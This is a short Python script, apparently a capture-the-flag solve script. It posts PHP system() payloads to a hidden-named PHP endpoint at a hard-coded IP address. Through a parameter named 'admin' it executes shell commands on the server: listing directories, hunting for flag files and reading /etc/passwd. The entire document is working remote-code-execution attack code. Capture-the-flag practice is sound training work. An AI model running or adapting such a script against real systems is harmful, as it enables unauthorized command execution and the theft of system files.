#!/usr/bin/env python3
import requests

url = 'http://61.147.171.35:51810/s3Cr37_f1L3.php'

# List files in current directory
commands = [
    'system("ls -la");',
    'system("cat /flag*");',
    'system("cat flag*");',
    'system("find / -name flag* 2>/dev/null");',
    'system("cat /etc/passwd");',
]

for cmd in commands:
    print(f"[*] Executing: {cmd}")
    r = requests.post(url, data={'admin': cmd})
    print(r.text)
    print("=" * 60)
